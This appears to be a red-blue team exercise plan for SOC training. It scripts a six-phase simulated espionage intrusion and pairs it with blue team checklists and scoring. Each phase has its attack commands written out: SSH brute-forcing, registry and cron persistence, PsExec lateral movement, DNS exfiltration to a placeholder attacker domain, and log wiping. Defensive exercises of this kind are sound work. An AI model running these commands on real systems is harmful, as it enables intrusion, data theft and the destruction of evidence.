# Red-Blue Team Exercise - Scenario 01
## "Corporate Espionage Campaign"

## Exercise Overview

**Exercise Name**: Corporate Espionage Campaign  
**Duration**: 4 hours  
**Difficulty**: Intermediate  
**Objective**: Test SOC detection and response capabilities against multi-stage attack

---

## Exercise Objectives

### Blue Team (SOC)
- Detect attack activities using SIEM
- Investigate alerts according to playbooks
- Contain threats within target timeframes
- Document findings and response actions

### Red Team (Attackers)
- Execute realistic attack scenario
- Simulate advanced persistent threat (APT) tactics
- Test detection blind spots
- Document what was detected vs. what succeeded

---

## Attack Scenario

### Backstory
A competitor has hired a threat actor to steal intellectual property from your organization. The attacker will attempt to:
1. Gain initial access
2. Establish persistence
3. Escalate privileges
4. Move laterally
5. Exfiltrate data

---

## Attack Chain (Red Team Playbook)

### Phase 1: Initial Access (T1110)
**Time**: 0-30 minutes  
**Technique**: Brute-Force Attack

**Actions**:
```bash
# Simulate SSH brute-force from external IP
# Use hydra or manual attempts
for i in {1..10}; do
  ssh testuser@target-server
  sleep 5
done
```

**Expected Detection**:
- Alert: Multiple failed login attempts
- MTTD Target: < 10 minutes

**Success Criteria**:
- Successful login achieved (or simulated)

---

### Phase 2: Persistence (T1547.001)
**Time**: 30-60 minutes  
**Technique**: Registry Run Key

**Actions** (Windows):
```powershell
# Create persistence via registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\updater.exe"
```

**Actions** (Linux):
```bash
# Create cron job persistence
echo "*/10 * * * * /tmp/backdoor.sh" | crontab -
```

**Expected Detection**:
- Alert: Registry modification or cron job creation
- MTTD Target: < 15 minutes

---

### Phase 3: Privilege Escalation (T1078)
**Time**: 60-90 minutes  
**Technique**: Abuse of Administrative Account

**Actions**:
```powershell
# Attempt to use stolen admin credentials
runas /user:administrator cmd.exe
```

**Expected Detection**:
- Alert: Unusual admin account login
- Alert: After-hours admin activity (if applicable)

---

### Phase 4: Lateral Movement (T1021.002)
**Time**: 90-150 minutes  
**Technique**: SMB/RDP to other systems

**Actions**:
```powershell
# Lateral movement via RDP
mstsc /v:target-workstation

# Or via PsExec
psexec \\target-workstation cmd.exe
```

**Expected Detection**:
- Alert: Unusual network connections
- Alert: PsExec usage
- MTTD Target: < 20 minutes

---

### Phase 5: Data Exfiltration (T1071.004)
**Time**: 150-210 minutes  
**Technique**: DNS Exfiltration

**Actions**:
```bash
# Simulate DNS exfiltration
# Encode data in DNS queries
for i in $(seq 1 50); do
  nslookup "data-$(openssl rand -hex 32).attacker-domain.com"
  sleep 2
done
```

**Expected Detection**:
- Alert: Unusual DNS query volume
- Alert: Long DNS queries
- MTTD Target: < 30 minutes

---

### Phase 6: Covering Tracks (T1070)
**Time**: 210-240 minutes  
**Technique**: Log Deletion

**Actions**:
```powershell
# Clear event logs (Windows)
wevtutil cl Security
wevtutil cl System
```

```bash
# Clear logs (Linux)
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
```

**Expected Detection**:
- Alert: Security log cleared
- Critical priority alert

---

## Blue Team Response Checklist

### Phase 1 Response (Brute-Force)
- [ ] Alert acknowledged within 5 minutes
- [ ] Source IP identified
- [ ] Source IP blocked at firewall
- [ ] Affected account secured
- [ ] Investigation documented

### Phase 2 Response (Persistence)
- [ ] Persistence mechanism identified
- [ ] Registry key or cron job removed
- [ ] System scan performed
- [ ] Additional persistence checked

### Phase 3 Response (Privilege Escalation)
- [ ] Admin account activity reviewed
- [ ] Unauthorized usage confirmed
- [ ] Account temporarily disabled
- [ ] Incident escalated

### Phase 4 Response (Lateral Movement)
- [ ] Affected systems identified
- [ ] Network connections analyzed
- [ ] Compromised systems isolated
- [ ] Full scope determined

### Phase 5 Response (Exfiltration)
- [ ] DNS traffic analyzed
- [ ] Exfiltration confirmed
- [ ] Data loss assessed
- [ ] Network egress blocked

### Phase 6 Response (Log Clearing)
- [ ] Log tampering detected
- [ ] Backup logs consulted
- [ ] Full forensic investigation initiated
- [ ] Senior management notified

---

## Exercise Execution

### Pre-Exercise Setup (1 day before)

**Red Team**:
1. Set up attack infrastructure
2. Prepare tools and scripts
3. Coordinate timing with Blue Team lead
4. Test attack paths

**Blue Team**:
1. Verify all detection rules active
2. Ensure SIEM is functioning
3. Review playbooks
4. Assign analyst roles

---

### During Exercise

**Timeline**:
- T+0:00 - Exercise starts, Red Team begins Phase 1
- T+0:30 - Phase 2 begins
- T+1:00 - Phase 3 begins
- T+1:30 - Phase 4 begins
- T+2:30 - Phase 5 begins
- T+3:30 - Phase 6 begins
- T+4:00 - Exercise ends, debrief begins

**Communication**:
- Red Team lead maintains activity log
- Blue Team documents all actions
- No direct communication between teams during exercise
- Exercise coordinator monitors both teams

---

### Post-Exercise Debrief (1 hour)

**Discussion Topics**:
1. What was detected?
2. What was missed?
3. Response time analysis
4. Playbook effectiveness
5. Tool performance
6. Lessons learned

---

## Scoring Rubric

### Detection Score (40 points)
- Phase 1 detected: 5 points
- Phase 2 detected: 7 points
- Phase 3 detected: 8 points
- Phase 4 detected: 10 points
- Phase 5 detected: 10 points

### Response Score (40 points)
- Appropriate containment: 15 points
- Correct investigation: 15 points
- Proper documentation: 10 points

### Time Score (20 points)
- MTTD < target: 10 points
- MTTR < target: 10 points

**Total Possible**: 100 points

**Grading**:
- 90-100: Excellent
- 75-89: Good
- 60-74: Needs Improvement
- <60: Significant gaps

---

## Success Criteria

**Minimum Success**:
- Detect at least 4 of 6 attack phases
- Contain attack before exfiltration
- Document complete timeline

**Full Success**:
- Detect all 6 attack phases
- MTTD and MTTR within targets
- Complete incident report
- Actionable recommendations

---

## Safety Considerations

- Exercise conducted in isolated test environment
- No production systems involved
- Backups created before exercise
- Emergency stop procedure in place
- Legal authorization documented

---

**Exercise Version**: 1.0  
**Last Updated**: November 27, 2025
